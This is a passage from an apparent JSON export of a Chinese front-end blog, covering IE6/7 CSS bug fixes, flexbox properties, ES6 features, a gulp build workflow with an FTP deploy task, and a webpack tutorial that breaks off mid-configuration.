class=\"left\"&gt;&lt;/div&gt; &lt;div&gt;&lt;!--IE6下的文字溢出--&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt; &lt;div class=\"right\"&gt;@poetries&lt;/div&gt;&lt;/div&gt; 常见问题十二：IE6下，当浮动元素和绝对定位元素是并列关系的时候，绝对定位元素会消失 解决办法：给定位元素外面包一个div 1234567891011121314151617181920212223*&#123;margin:0px;padding:0px;&#125;.box&#123; width:200px; height:200px; border:1px solid #000; position:relative;&#125;ul&#123; width:150px; height:150px; background:red; float:left; margin:0 0 0 50px;&#125;span&#123; width:50px; height:50px; background:blue; position:absolute; right:-20px; top:0;&#125; 1234&lt;div class=\"box\"&gt; &lt;ul&gt;&lt;/ul&gt; &lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; 常见问题十三：IE67下，子元素有相对定位属性，父元素的overflow包不住子元素 解决办法：给父元素也添加相对定位属性 1234567891011121314151617181920*&#123;margin:0px;padding:0px;&#125;.box&#123; width:200px; height:200px; border:1px solid red; overflow:auto; position:relative;&#125;.con&#123; width:150px; height:300px; background:blue; position:relative;&#125;``` ```html&lt;div class=\"box\"&gt; &lt;div class=\"con\"&gt;&lt;/div&gt;&lt;/div&gt; 常见问题十四：IE6下，绝对定位的父元素的宽高为奇数的时候，元素的right和bottom值会有1px的偏差 1234567891011121314*&#123;margin:0px;padding:0px;&#125;.box&#123; width:201px; height:201px; border:1px solid red; position:relative;&#125;span&#123; width:20px; height:20px; background:blue; position:absolute; right:-1px;bottom:-1px;&#125; 123&lt;div class=\"box\"&gt; &lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; 常见问题十五：IE6不支持固定定位 css没办法解决 12345678910*&#123;margin:0px;padding:0px;&#125;/*去除默认外边距、内边距*/.box&#123; width:100px; height:100px; background:red; position:fixed; left:50px; top:100px;&#125; 1div class=\"box\"&gt;&lt;/div&gt; 常见问题十六：IE6 7下，输入类型的表单控件上下各有1px间隙 解决办法：给input加浮动 123456789101112*&#123;margin:0px;padding:0px;&#125;.box&#123; width:200px; height:32px; border:1px solid red; &#125;input&#123; width:100px; height:28px; padding:0; float:left;&#125; 123&lt;div class=\"box\"&gt; &lt;input type=\"text\"/&gt;&lt;/div&gt; 常见问题十七：IE6 7下，输入类型的表单控件加border:none没用 解决办法： 1、border:0; 2、给input添加背景颜色 1234567891011121314*&#123;margin:0px;padding:0px;&#125;.box&#123; width:200px; height:32px; border:1px solid red; &#125;input&#123; width:100px; height:28px; padding:0; float:left; border:none; background:#fff;&#125; 123&lt;div class=\"box\"&gt; &lt;input type=\"text\"/&gt;&lt;/div&gt; 常见问题十八： 1、输入类型的表单控件添加背景图片url和no-repeat之间一定要有空格 2、输入文字时候，背景图片会跟着移动 解决办法：2、给背景图片固定定位，但是在IE7下 背景图片显示会错误 最佳办法：把背景图添加给父元素 12345678910111213141516*&#123;margin:0px;padding:0px;&#125;.box&#123; width:200px; height:32px; border:1px solid red; background:url(ball.png) no-repeat; &#125;input&#123; width:100px; height:30px; padding:0; float:left; border:none; background:none; /*background:#fff url(ball.png) no-repeat fixed;*/&#125; 123&lt;div class=\"box\"&gt; &lt;input type=\"text\"/&gt;&lt;/div&gt; 常见问题十九：IE6不支持tbody 123456789101112131415*&#123;margin:0px;padding:0px;&#125;table&#123; width:200px; border-collapse:collapse; background:red;&#125;tbody&#123; background:blue;&#125;tr&#123; background:url(ball.png) no-repeat;&#125;td&#123; height:20px;&#125; 12345&lt;table&gt; &lt;tr&gt; &lt;td&gt;表格&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"},{"name":"csshack","slug":"csshack","permalink":"https://ru23.com/tags/csshack/"}]},{"title":"弹性布局总结","slug":"2017-02-flex","date":"2017-02-06T11:20:43.000Z","updated":"2018-10-24T03:46:02.071Z","comments":true,"path":"note/cc5b9b13.html","link":"","permalink":"https://ru23.com/note/cc5b9b13.html","excerpt":"","text":"以下6个属性设置在容器上 flex-direction flex-wrap flex-flow justify-content align-items align-content 属性详解 flex-direction: row | row-reverse | column | column-reverse; flex-wrap: nowrap | wrap | wrap-reverse; flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;; justify-content属性定义了项目在主轴上的对齐方式。 justify-content: flex-start | flex-end | center | space-between | space-around; align-items属性定义项目在交叉轴上如何对齐。 align-items: flex-start | flex-end | center | baseline | stretch; align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 align-content: flex-start | flex-end | center | space-between | space-around | stretch; 以下6个属性设置在项目上 order flex-grow flex-shrink flex-basis flex align-self 属性详解 order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 align-self: auto | flex-start | flex-end | center | baseline | stretch; 图解flex布局","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"弹性布局","slug":"弹性布局","permalink":"https://ru23.com/tags/弹性布局/"}]},{"title":"ES6新特性","slug":"2017-02-es6-new-property","date":"2017-02-04T10:20:43.000Z","updated":"2018-10-24T03:46:02.069Z","comments":true,"path":"note/de81bfb9.html","link":"","permalink":"https://ru23.com/note/de81bfb9.html","excerpt":"","text":"一、作用域 块级作用域 块级变量let 块级常量 const 二、箭头函数 sum = (a,b)=&gt; a + b nums.forEach(v=&gt; {console.log(v)}) 词法 this 三、参数处理 默认参数值 剩余参数 展开运算符 四、模板字面量 多行字符串 字符串插值 带标签的模板字面量 原始字符串 五、原有字面量加强 更安全的二进制字面量(0b1111101) 更安全的八进制字面量(0o767) 字符串支持Unicode String.fromCodePoint String.prototype.codePointAt 正则表达式字面量添加 Unicode 正则表达式添加y标记，支持粘滞匹配 对象属性加强 属性定义支持短语法obj = {x,y} 属性名支持表达式 obj = {[&quot;baz&quot;+quux()]:42} 添加__proto__属性，但不建议使用 六、解构赋值 匹配 [b,a] = [a,b] 对象匹配 let {a,b,c} = objABC 参数匹配 function g({name:n,val:v}){} 七、模块 导入(import) 导出(export) 默认导出(export default) 八、类 使用extends继承 重写构造器 super关键字 九、迭代 迭代器 for of 十、生成器 十一、promise 十二、元编程 代理(proxy) 反射(Reflex) 十三、新增数据类型 Symbol类型 Set类型 Map类型 WeakSet类型 WeakMap类型 TypedArray类型 十四、原有内置对象API增强 Object.assign Array.from Array.of Array.prototype.fill Array.prototype.find Array.prototype.findIndex Array.prototype.copyWithin Array.prototype.entries Array.prototype.keys Array.prototype.values String.prototype.includes String.prototype.repeat String.prototype.startsWidth String.prototype.endsWidth() Number.EPSILON Number.isInteger Number.isSafeInteger Number.isFinite Number.isNaN(&quot;NaN&quot;) Math.acosh Math.hypot Math.imul Math.sign Math.trunc","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"https://ru23.com/tags/ES6/"}]},{"title":"基于gulp的工作流配置","slug":"2017-01-gulp-works","date":"2017-01-21T09:40:43.000Z","updated":"2018-10-24T03:46:02.050Z","comments":true,"path":"note/3e0bf339.html","link":"","permalink":"https://ru23.com/note/3e0bf339.html","excerpt":"配置一套基于gulp的工作流，满足日常的基本开发。","text":"配置一套基于gulp的工作流，满足日常的基本开发。 一、目录结构 一套基于gulp的工作流 二、 package.json 1234567891011121314151617181920212223242526272829&#123; \"name\": \"gulp-project\", \"scripts\": &#123; \"dev\": \"gulp dev\", //npm run dev 开发 \"build\": \"gulp build\", //npm run build 发布 \"upload\": \"gulp upload\", //npm run upload 上传服务器 \"zip\": \"gulp zip\" ////npm run zip 打包文件 &#125;, \"devDependencies\": &#123; \"babel-preset-es2015\": \"^6.22.0\", //编译es6 \"browser-sync\": \"^2.15.0\", //监听改动刷新 \"gulp\": \"^3.9.1\", //gulp \"gulp-autoprefixer\": \"^3.1.1\", //补齐css浏览器前缀 \"gulp-babel\": \"^6.1.2\", // Es6 \"gulp-clean\": \"^0.3.2\", //删除文件 \"gulp-clean-css\": \"^2.0.12\", //css压缩，gulp-minify-css不更新了 \"gulp-concat\": \"^2.6.0\",//合并文件 \"gulp-ftp\": \"^1.1.0\",//提交到ftp服务器 \"gulp-git\": \"^1.11.3\",//提交到git \"gulp-htmlmin\": \"^2.0.0\",//压缩html \"gulp-imagemin\": \"^3.0.3\",//压缩图片 \"gulp-rename\": \"^1.2.2\",//重命名文件 \"gulp-rev-append\": \"^0.1.6\", //添加MD5版本号，这里改成了时间戳 \"gulp-sass\": \"^2.3.2\",//编译SASS \"gulp-uglify\": \"^2.0.0\",//js压缩 \"gulp-util\": \"^3.0.7\", //说是ftp配套用的，看了下是包装了些常用函数 \"gulp-zip\": \"^3.2.0\" // 打包文件 &#125;&#125; 三、 gulpfile.js 1234567891011121314151617181920//组件let gulp = require('gulp'), browserSync = require('browser-sync').create(), //监听刷新 reload = browserSync.reload, ftp = require('gulp-ftp'), // ftp上传 gutil = require('gulp-util'), sass = require('gulp-sass'), // sass cleancss = require('gulp-clean-css'), // CSS压缩 autoprefixer = require(\"gulp-autoprefixer\"), uglify = require('gulp-uglify'), // js压缩 concat = require('gulp-concat'), // 合并文件 rename = require('gulp-rename'), // 重命名 clean = require('gulp-clean'), //清空文件夹 imagemin = require('gulp-imagemin'), //压缩图片 zip = require('gulp-zip'), //打包文件 rev = require('gulp-rev-append'), //添加MD5 htmlmin = require('gulp-htmlmin'), // 压缩html git = require('gulp-git'), //git babel = require(\"gulp-babel\"); //ES6 转es5 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// =========== 开发构建流程 [多文件输出] ==============//devgulp.task('sass:dev', () =&gt; &#123; gulp.src('src/sass/*.scss') .pipe(sass()) .pipe(gulp.dest('src/css/')) .pipe(reload(&#123; stream: true &#125;))&#125;);// 合并、重命名cssgulp.task('css:dev', ['sass:dev'], () =&gt; &#123; gulp.src(['src/css/*.css', '!src/css/areaMap.css']) .pipe(concat('all.css')) .pipe(gulp.dest('dist/css/'))&#125;);// 合并、重命名jsgulp.task('js:dev', () =&gt; &#123; gulp.src('src/js/*.js') .pipe(babel(&#123; presets: ['es2015'] &#125;)) //ES6转ES5 //.pipe(concat('all.js')) 开发阶段分开输出js文件 .pipe(gulp.dest('dist/js/')) .pipe(reload(&#123; stream: true &#125;))&#125;);// HTMLgulp.task('html:dev', () =&gt; &#123; gulp.src('src/tpl/*.html') .pipe(gulp.dest('dist'))&#125;);// 将lib的库文件对应到指定位置gulp.task('lib:dev', () =&gt; &#123; gulp.src('./src/lib/*') .pipe(gulp.dest('./dist/lib/'));&#125;);//开发构建gulp.task('dev', ['css:dev', 'js:dev', 'html:dev', 'img','copyFonts','lib'], () =&gt; &#123; browserSync.init(&#123; server: &#123; baseDir: \"dist\" // 设置服务器的根目录为dist目录 &#125;, notify: false // 开启静默模式 &#125;); // 我们使用gulp的文件监听功能，来实时编译修改过后的文件 gulp.watch('src/js/*.js', ['js:dev']); gulp.watch('src/sass/*.scss', ['sass:dev']); gulp.watch('src/tpl/*.html', ['html:dev']); gulp.watch('src/fonts/**', ['copyFonts']); gulp.watch('src/images/**', ['img']); gulp.watch('src/lib/**', ['lib']);&#125;); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192// =========== 正式构建 build [单文件输出] ==============// sass解析gulp.task('sass', () =&gt; &#123; gulp.src('src/sass/*.scss') //输出为压缩 .pipe(sass(&#123; outputStyle: 'compressed' &#125;)) .pipe(sass()) .pipe(gulp.dest('src/css/'))&#125;);// 合并、压缩、重命名cssgulp.task('css', ['sass'], () =&gt; &#123; gulp.src(['src/css/*.css', '!src/css/areaMap.css']) .pipe(concat('all.css')) .pipe(autoprefixer(&#123; browsers: ['last 2 versions', 'Android &gt;= 4.0'], cascade: true, //是否美化属性值 默认：true 像这样： remove: false //是否去掉不必要的前缀 默认：true &#125;)) .pipe(cleancss()) //压缩css .pipe(gulp.dest('dist/css'));&#125;);// 合并，压缩,重命名js文件gulp.task('js', () =&gt; &#123; gulp.src('src/js/*.js') .pipe(babel(&#123; presets: ['es2015'] &#125;)) //ES6转ES5 .pipe(concat('all.js')) .pipe(uglify()) .pipe(gulp.dest('dist/js'));&#125;);// 压缩HTMLgulp.task('html', () =&gt; &#123; gulp.src('src/tpl/*.html') .pipe(rev())//记得在引用地址后面加后缀，插件原本是ver=@@hash ,这里改成了v=@@hash //&lt;link rel=\"stylesheet\" href=\"css/all.css?v=@@hash\"&gt; //&lt;script src=\"js/all.js?v=@@hash\"&gt;&lt;/script&gt; .pipe(htmlmin(&#123; removeComments: true, //清除HTML注释 collapseWhitespace: true, //压缩HTML collapseBooleanAttributes: true, //省略布尔属性的值 &lt;input checked=\"true\"/&gt; ==&gt; &lt;input /&gt; removeEmptyAttributes: true, //删除所有空格作属性值 &lt;input id=\"\" /&gt; ==&gt; &lt;input /&gt; removeScriptTypeAttributes: true, //删除&lt;script&gt;的type=\"text/javascript\" removeStyleLinkTypeAttributes: true, //删除&lt;style&gt;和&lt;link&gt;的type=\"text/css\" minifyJS: true, //压缩页面JS minifyCSS: true //压缩页面CSS &#125;)) .pipe(gulp.dest('dist'))&#125;);//压缩图片gulp.task('img', () =&gt; &#123; gulp.src('src/images/*.&#123;png,jpg,gif,ico&#125;') .pipe(imagemin(&#123; optimizationLevel: 5, //类型：Number 默认：3 取值范围：0-7（优化等级） progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片 interlaced: true, //类型：Boolean 默认：false 隔行扫描gif进行渲染 multipass: true //类型：Boolean 默认：false 多次优化svg直到完全优化 &#125;)) .pipe(gulp.dest('dist/images'));&#125;);//字体文件gulp.task('copyFonts', function () &#123; gulp.src('src/fonts/**/*') .pipe(gulp.dest('dist/fonts/'))&#125;);// 清空图片、样式、jsgulp.task('clean', () =&gt; &#123; gulp.src('dist', &#123; read: false &#125;) .pipe(clean(&#123; force: true &#125;));&#125;);// 将bower的库文件对应到指定位置gulp.task('lib', () =&gt; &#123; gulp.src('/src/lib/*') .pipe(gulp.dest('/dist/lib/'));&#125;); 12345678910111213141516171819202122// ================ 打包主体dist 文件夹 zip ====//打包主体dist 文件夹并按照时间重命名gulp.task(&apos;zip&apos;, function()&#123; function checkTime(i) &#123; if (i &lt; 10) &#123; i = &quot;0&quot; + i &#125; return i &#125; var d=new Date(); var year=d.getFullYear(); var month=checkTime(d.getMonth() + 1); var day=checkTime(d.getDate()); var hour=checkTime(d.getHours()); var minute=checkTime(d.getMinutes()); return gulp.src(&apos;./dist/**&apos;) .pipe(zip(year+month+day +hour+minute+&apos;.zip&apos;)) .pipe(gulp.dest(&apos;./zip&apos;));&#125;); 1234567891011121314151617//正式构建gulp.task('build', ['clean','css', 'js', 'img', 'html','copyFonts','lib']);// ================ 上传 upload ====gulp.task('upload', () =&gt; &#123; gulp.src('dist/**') .pipe(ftp(&#123; host: '8.8.8.8', // 远程主机ip port: 22, // 端口 user: 'username', // 帐号 pass: 'password', // 密码 remotePath: '/project' // 上传路径，不存在则新建 &#125;)) .pipe(gutil.noop())&#125;)","categories":[{"name":"Build","slug":"Build","permalink":"https://ru23.com/categories/Build/"}],"tags":[{"name":"gulp","slug":"gulp","permalink":"https://ru23.com/tags/gulp/"}]},{"title":"webpack学习总结(二)","slug":"2017-01-webpack-summary","date":"2017-01-14T09:40:43.000Z","updated":"2018-10-24T03:46:02.065Z","comments":true,"path":"note/c6147aa3.html","link":"","permalink":"https://ru23.com/note/c6147aa3.html","excerpt":"","text":"声明 本教程整理于互联网 webpack是当下最热门的前端资源模块化管理和打包工具。它可以将许多松散的模块按照依赖和规则打包成符合生产环境部署的前端资源。还可以将按需加载的模块进行代码分隔，到实际需要的时候再异步加载。通过 loader 的转换，任何形式的资源都可以视作模块，比如CommonJs模块、 AMD 模块、 ES6 模块、CSS、图片、 JSON、Coffeescript、 LESS等 一、模块系统的演进 模块系统主要解决模块的定义、依赖和导出，先来看看已经存在的模块系统 &lt;script&gt;标签 1234&lt;script src=&quot;module1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;module2.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;libraryA.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;module3.js&quot;&gt;&lt;/script&gt; 这是最原始的 JavaScript 文件加载方式，如果把每一个文件看做是一个模块，那么他们的接口通常是暴露在全局作用域下，也就是定义在 window 对象中，不同模块的接口调用都是一个作用域中，一些复杂的框架，会使用命名空间的概念来组织这些模块的接口，典型的例子如 YUI 库 这种原始的加载方式暴露了一些显而易见的弊端 全局作用域下容易造成变量冲突 文件只能按照 &lt;script&gt;的书写顺序进行加载 开发人员必须主观解决模块和代码库的依赖关系 在大型项目中各种资源难以管理，长期积累的问题导致代码库混乱不堪 1.1 CommonJS 服务器端的 Node.js遵循 CommonJS规范，该规范的核心思想是允许模块通过require方法来同步加载所要依赖的其他模块，然后通过 exports 或 module.exports 来导出需要暴露的接口 1234require(&quot;module&quot;);require(&quot;../file.js&quot;);exports.doStuff = function() &#123;&#125;;module.exports = someValue; 优点： 服务器端模块便于重用 NPM 中已经有将近20万个可以使用模块包 简单并容易使用 缺点： 同步的模块加载方式不适合在浏览器环境中，同步意味着阻塞加载，浏览器资源是异步加载的 不能非阻塞的并行加载多个模块 实现 服务器端的 Node.js Browserify，浏览器端的 CommonJS 实现，可以使用 NPM的模块，但是编译打包后的文件体积可能很大 modules-webmake，类似Browserify，还不如 Browserify 灵活 wreq，Browserify的前身 1.2 AMD Asynchronous Module Definition 规范其实只有一个主要接口define(id?, dependencies?,factory) ，它要在声明模块的时候指定所有的依赖 dependencies，并且还要当做形参传到factory 中，对于依赖的模块提前执行，依赖前置 123define(&quot;module&quot;, [&quot;dep1&quot;, &quot;dep2&quot;], function(d1, d2) &#123;return someExportedValue;&#125;);require([&quot;module&quot;, &quot;../file&quot;], function(module, file) &#123; /* ... */ &#125;); 优点： 适合在浏览器环境中异步加载模块 可以并行加载多个模块 缺点： 提高了开发成本，代码的阅读和书写比较困难，模块定义方式的语义 不顺畅 不符合通用的模块化思维方式，是一种妥协的实现 实现： RequireJS curl 1.3 CMD Common Module Definition 规范和 AMD很相似，尽量保持简单，并与 CommonJS 和Node.js 的 Modules规范保持了很大的兼容性 123456define(function(require, exports, module) &#123;var $ = require(&apos;jquery&apos;);var Spinning = require(&apos;./spinning&apos;);exports.doSomething = ...module.exports = ...&#125;) 优点： 依赖就近，延迟执行 可以很容易在 Node.js 中运行 缺点： 依赖 SPM 打包，模块的加载逻辑偏重 实现： Sea.js coolie 1.4 ES6 模块 EcmaScript6 标准增加了 JavaScript语言层面的模块体系定义。ES6 模块的设计思想，是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和AMD 模块，都只能在运行时确定这些东西 123import &quot;jquery&quot;;export function doStuff() &#123;&#125;module &quot;localModule&quot; &#123;&#125; 优点： 容易进行静态分析 面向未来的 EcmaScript标准 缺点： 原生浏览器端还没有实现该标准 全新的命令字，新版的 Node.js才支持 实现： Babel 1.5 前端模块加载 前端模块要在客户端中执行，所以他们需要增量加载到浏览器中 模块的加载和传输，我们首先能想到两种极端的方式，一种是每个模块文件都单独请求，另一种是把所有模块打包成一个文件然后只请求一次。显而易见，每个模块都发起单独的请求造成了请求次数过多，导致应用启动速度慢；一次请求加载所有模块导致流量浪费、初始化过程慢。这两种方式都不是好的解决方案，它们过于简单粗暴 分块传输，按需进行懒加载，在实际用到某些模块的时候再增量更新，才是较为合理的模块加载方案 要实现模块的按需加载，就需要一个对整个代码库中的模块进行静态分析、编译打包的过程 1.6 所有资源都是模块 在上面的分析过程中，我们提到的模块仅仅是指JavaScript模块文件。然而，在前端开发过程中还涉及到样式、图片、字体、HTML 模板等等众多的资源。这些资源还会以各种方言的形式存在，比如 coffeescript、 less、 sass、众多的模板库、多语言系统（i18n）等 如果他们都可以视作模块，并且都可以通过 require 的方式来加载，将带来优雅的开发体验，比如 1234require(&quot;./style.css&quot;);require(&quot;./style.less&quot;);require(&quot;./template.jade&quot;);require(&quot;./image.png&quot;); 那么如何做到让 require 能加载各种资源呢？ 1.7 静态分析 在编译的时候，要对整个代码进行静态分析，分析出各个模块的类型和它们依赖关系，然后将不同类型的模块提交给适配的加载器来处理。比如一个用LESS 写的样式模块，可以先用LESS 加载器将它转成一个CSS模块，在通过 CSS 模块把他插入到页面的 &lt;style&gt; 标签中执行。Webpack就是在这样的需求中应运而生 二、webpack基础知识 2.1 什么是 Webpack Webpack 是一个模块打包器。它将根据模块的依赖关系进行静态分析，然后将这些模块按照指定的规则生成对应的静态资源 2.2 Webpack 的特点 代码拆分 Webpack有两种组织模块依赖的方式，同步和异步。异步依赖作为分割点，形成一个新的块。在优化了依赖树后，每一个异步区块都作为一个文件被打包 Loader Webpack 本身只能处理原生的 JavaScript 模块，但是 loader 转换器可以将各种类型的资源转换成 JavaScript 模块。这样，任何资源都可以成为 Webpack可以处理的模块 智能解析 Webpack 有一个智能解析器，几乎可以处理任何第三方库，无论它们的模块形式是CommonJS、 AMD还是普通的 JS 文件。甚至在加载依赖的时候，允许使用动态表达式require(&quot;./templates/&quot; + name + &quot;.jade&quot;) 插件系统 Webpack 还有一个功能丰富的插件系统。大多数内容功能都是基于这个插件系统运行的，还可以开发和使用开源的 Webpack 插件，来满足各式各样的需求 快速运行 Webpack 使用异步 I/O 和多级缓存提高运行效率，这使得 Webpack能够以令人难以置信的速度快速增量编译 2.3 总览 他的目的就是把有依赖关系的各种文件打包成一系列的静态资源 webpack简单点来说就就是一个配置文件，所有的魔力都是在这一个文件中发生的。 这个配置文件主要分为三大块 entry 入口文件 让webpack用哪个文件作为项目的入口 output 出口 让webpack把处理完成的文件放在哪里 module 模块 要用什么不同的模块来处理各种类型的文件 Paste_Image.png 2.4 安装 先装好node和npm，因为webpack是一个基于node的项目。然后 1npm install -g webpack 此时 Webpack已经安装到了全局环境下，可以通过命令行webpack -h 试试 通常我们会将 Webpack安装到项目的依赖中，这样就可以使用项目本地版本的 Webpack 1234# 进入项目目录# 确定已经有 package.json，没有就通过 npm init 创建# 安装 webpack 依赖$ npm install webpack --save-dev Webpack 目前有两个主版本，一个是在 master 主干的稳定版，一个是在 webpack-2 分支的测试版，测试版拥有一些实验性功能并且和稳定版不兼容，在正式项目中应该使用稳定版 1234# 查看 webpack 版本信息$ npm info webpack# 安装指定版本的 webpack$ npm install webpack@1.12.x --save-dev 如果需要使用 Webpack开发工具，要单独安装 1$ npm install webpack-dev-server --save-dev 2.5 建立一个项目 123mkdir webpackcd webpacknpm init 如果你使用git管理你的这个项目的话，建议你新建一个.gitignore文件，不要让git提交一些node依赖的模块 创建一个静态页面 index.html 和一个 JS 入口文件 entry.js： 123456789&lt;!-- index.html --&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=\"bundle.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12// entry.jsdocument.write('It works.') 然后编译 entry.js 并打包到 bundle.js： 1$ webpack entry.js bundle.js 打包过程会显示日志： 123456Hash: e964f90ec65eb2c29bb9Version: webpack 1.12.2Time: 54msAsset Size Chunks Chunk Namesbundle.js 1.42 kB 0 [emitted] main[0] ./entry.js 27 bytes &#123;0&#125; [built] 用浏览器打开 index.html 将会看到 It works. 接下来添加一个模块 module.js并修改入口 entry.js： 12// module.jsmodule.exports = &apos;It works from module.js.&apos; 123// entry.jsdocument.write(&apos;It works.&apos;)document.write(require(&apos;./module.js&apos;)) // 添加模块 重新打包 webpack entry.js bundle.js后刷新页面看到变化 It works.It works from module.js. Webpack 会分析入口文件，解析包含依赖关系的各个文件。这些文件（模块）都打包到bundle.js 。Webpack 会给每个模块分配一个唯一的id并通过这个id 索引和访问模块。在页面启动时，会先执entry.js 中的代码，其它模块会在运行require的时候再执行 三、Loader Webpack 本身只能处理 JavaScript 模块，如果要处理其他类型的文件，就需要使用 loader进行转换 Loader 可以理解为是模块和资源的转换器，它本身是一个函数，接受源文件作为参数，返回转换的结果。这样，我们就可以通过 require 来加载任何类型的模块或文件，比如CoffeeScript、 JSX、 LESS 3.1 loader 有哪些特性 Loader 可以通过管道方式链式调用，每个 loader 可以把资源转换成任意格式并传递给下一个 loader ，但是最后一个 loader 必须返回 JavaScript Loader可以同步或异步执行。 Loader 运行在 node.js 环境中，所以可以做任何可能的事情。 Loader 可以接受参数，以此来传递配置项给 loader。 Loader 可以通过文件扩展名（或正则表达式）绑定给不同类型的文件。 Loader可以通过 npm发布和安装。 除了通过 package.json的 main指定，通常的模块也可以导出一个 loader来使用。 Loader 可以访问配置。 插件可以让 loader 拥有更多特性。 Loader可以分发出附加的任意文件 Loader本身也是运行在 node.js 环境中的 JavaScript模块，它通常会返回一个函数。大多数情况下，我们通过 npm 来管理 loader，但是你也可以在项目中自己写 loader 模块 按照惯例，而非必须，loader 一般以 xxx-loader 的方式命名， xxx 代表了这个 loader要做的转换功能，比如 json-loader 在引用 loader 的时候可以使用全名 json-loader ，或者使用短名 json。这个命名规则和搜索优先级顺序在webpack 的resolveLoader.moduleTemplates api中定义 1Default: [&quot;*-webpack-loader&quot;, &quot;*-web-loader&quot;, &quot;*-loader&quot;, &quot;*&quot;] Loader可以在 require()引用模块的时候添加，也可以在 webpack 全局配置中进行绑定，还可以通过命令行的方式使用 我们要在页面中引入一个CSS文件style.css，首页将 style.css也看成是一个模块，然后用 css-loader 来读取它，再用style-loader把它插入到页面中 1234/* style.css */body &#123; background: yellow; &#125; 修改 entry.js： 123require(&quot;!style!css!./style.css&quot;) // 载入 style.cssdocument.write(&apos;It works.&apos;)document.write(require(&apos;./module.js&apos;)) 安装 loader： 1npm install css-loader style-loader 重新编译打包，刷新页面，就可以看到黄色的页面背景了 如果每次 require CSS 文件的时候都要写 loader 前缀，是一件很繁琐的事情。我们可以根据模块类型（扩展名）来自动绑定需要的 loader 将 entry.js 中的 require(&quot;!style!css!./style.css&quot;)修改为 require(&quot;./style.css&quot;)，然后执行： 123$ webpack entry.js bundle.js --module-bind &apos;css=style!css&apos;# 有些环境下可能需要使用双引号$ webpack entry.js bundle.js --module-bind &quot;css=style!css&quot; 显然，这两种使用 loader 的方式，效果是一样的 四、配置webpack Webpack在执行的时候，除了在命令行传入参数，还可以通过指定的配置文件来执行。默认情况下，会搜索当前目webpack.config.js 文件，这个文件是一个 node.js模块，返回一个json 格式的配置信息对象，或者通过 --config 选项来指定配置文件 现在开始配置webpack，目标是把这两个js文件合并成一个文件. 我们可以自己在build文件夹里面手动建一个index.html文件夹，然后再把合并以后的js引用在里面，但是这样有些麻烦，所以我们这里安装一个plugin，可以自动快速的帮我们生成HTML 创建一个配置文件 webpack.config.js 12345678910111213var webpack = require(&apos;webpack&apos;)module.exports = &#123;entry: &apos;./entry.js&apos;,output: &#123;path: __dirname,filename: &apos;bundle.js&apos;&#125;,module: &#123;loaders: [&#123;test: /\\.css$/, loader: &apos;style!css&apos;&#125;]&#125;&#125; 同时简化 entry.js 中的 style.css 加载方式 require(&#39;./style.css&#39;) 最后运行 webpack ，可以看到 webpack 通过配置文件执行的结果和通过命令行webpack entry.js bundle.js --module-bind &#39;css=style!css&#39;执行的结果是一样的 1npm install html-webpack-plugin --save-dev 有了这个插件 开始写config文件 123456789101112131415161718192021var path = require(&apos;path&apos;);var HtmlwebpackPlugin = require(&apos;html-webpack-plugin&apos;);//定义了一些文件夹的路径var ROOT_PATH = path.resolve(__dirname);var APP_PATH = path.resolve(ROOT_PATH, &apos;app&apos;);var BUILD_PATH = path.resolve(ROOT_PATH, &apos;build&apos;);module.exports = &#123;//项目的文件夹 可以直接用文件夹名称 默认会找index.js 也可以确定是哪个文件名字entry: APP_PATH,//输出的文件名 合并以后的js会命名为bundle.jsoutput: &#123;path: BUILD_PATH,filename: &apos;bundle.js&apos;&#125;,//添加我们的插件 会自动生成一个html文件plugins: [new HtmlwebpackPlugin(&#123;title: &apos;Hello World app&apos;&#125;)]&#125;; 然后在项目根目录运行 1webpack 你会发现多出来一个build文件夹，直接点开里面的html文件，你会发现我们可爱的“hello world”已经插入到页面了。我们的任务完成了，成功生成html，合并js，html引入了js，js被执行了 4.1 配置webpack-dev-server 上面任务虽然完成了，但是我们要不断运行程序然后查看页面，所以最好新建一个开发服务器，可以serve我们pack以后的代码，并且当代码更新的时候自动刷新浏览器 安装webpack-dev-server 1npm install webpack-dev-server --save-dev 安装完毕后在config中添加配置 12345678910module.exports = &#123;devServer: &#123;historyApiFallback: true,hot: true,inline: true,progress: true,&#125;,&#125; 然后再package.json里面配置一下运行的命令,npm支持自定义一些命令 123&quot;scripts&quot;: 